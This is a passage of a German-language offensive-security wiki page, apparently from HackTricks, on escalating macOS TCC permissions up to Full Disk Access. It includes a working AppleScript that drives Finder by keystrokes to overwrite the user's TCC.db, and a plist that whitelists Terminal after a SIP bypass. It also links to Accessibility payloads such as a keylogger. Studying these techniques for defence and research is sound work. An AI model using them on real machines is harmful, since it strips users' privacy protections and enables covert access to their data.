Automation über **`System Events`** + Barrierefreiheit (**`kTCCServicePostEvent`**) ermöglicht das Senden von **Tastatureingaben an Prozesse**. Auf diese Weise könntest du Finder missbrauchen, um die TCC.db des Benutzers zu ändern oder einer beliebigen App FDA zu gewähren (wobei möglicherweise nach einem Passwort gefragt wird).

Beispiel: Finder überschreibt die TCC.db des Benutzers.

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` zu FDA\*

Auf dieser Seite findest du einige [**Payloads zum Missbrauch der Accessibility-Berechtigungen**](macos-tcc-payloads.md#accessibility), um beispielsweise deine Rechte bis zu FDA\* zu erweitern oder einen Keylogger auszuführen.

### **Endpoint Security Client zu FDA**

Wenn du **`kTCCServiceEndpointSecurityClient`** hast, hast du FDA. Fertig.

### Systemrichtlinien-SysAdmin-Datei zu FDA

**`kTCCServiceSystemPolicySysAdminFiles`** ermöglicht es, das Attribut **`NFSHomeDirectory`** eines Benutzers zu **ändern**. Dadurch ändert sich sein Home-Verzeichnis und TCC kann **umgangen werden**.<sup>[[5]](#references)</sup>

### Benutzer-TCC-Datenbank zu FDA

Wenn du **Schreibberechtigungen** für die **TCC-Datenbank des Benutzers** erlangst, kannst du dir **keine** **`FDA`**-Berechtigungen erteilen. Das geht nur über die Datenbank auf Systemebene.

Du kannst dir aber **Automatisierungsrechte für den Finder** geben und die vorherige Technik missbrauchen, um deine Rechte bis zu FDA\* zu erweitern.

### **FDA zu TCC-Berechtigungen**

Der TCC-Name für **Full Disk Access** lautet **`kTCCServiceSystemPolicyAllFiles`**.

Ich glaube nicht, dass dies eine echte Rechteausweitung ist, aber vielleicht ist es trotzdem nützlich: Wenn du ein Programm mit FDA kontrollierst, kannst du die TCC-Datenbank des Benutzers **ändern und dir beliebige Zugriffsrechte erteilen**. Das kann als Persistenztechnik nützlich sein, falls du deine FDA-Berechtigungen verlieren solltest.

### **SIP-Umgehung zu TCC-Umgehung**

Die **TCC-Systemdatenbank** ist durch **SIP** geschützt. Deshalb können nur Prozesse mit den **angegebenen Entitlements** sie ändern. Wenn ein Angreifer also eine **SIP-Umgehung** für eine **Datei** findet (also eine durch SIP geschützte Datei ändern kann), kann er:

- **Den Schutz** einer TCC-Datenbank **entfernen** und sich alle TCC-Berechtigungen erteilen. Beispielsweise könnte er eine dieser Dateien missbrauchen:
  - Die TCC-Systemdatenbank
  - REG.db
  - MDMOverrides.plist

Es gibt jedoch noch eine weitere Möglichkeit, diese **SIP-Umgehung zum Umgehen von TCC** zu missbrauchen: Die Datei `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ist eine Allowlist von Anwendungen, die eine TCC-Ausnahme benötigen. Wenn ein Angreifer also den **SIP-Schutz** dieser Datei **entfernen** und seine **eigene Anwendung** hinzufügen kann, kann die Anwendung TCC umgehen.\
Zum Beispiel, um Terminal hinzuzufügen:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC-Umgehungen


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Ein tiefer Einblick in macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - Skript zum Verfolgen von com.apple.macl (Gist von brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl verfolgen und in den Griff bekommen](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Umgehung der macOS-TCC-Datenschutzmechanismen durch Zufall und gezielt](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Home-Verzeichnis ändern und TCC umgehen, auch bekannt als CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL-Injection in TCC: und warum es (diesmal wahrscheinlich) kein Sicherheitsrisiko war](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Speicherort und Beschaffung von TCC.db unter macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Konfigurieren der macOS App Sandbox](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Kameraberechtigung](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Einstellungen für die Nutzlast „Privacy Preferences Policy Control“ der Geräteverwaltung für Apple-Geräte](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Eine macOS-Intrusion von der Köderphase bis zur Kompromittierung analysiert](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
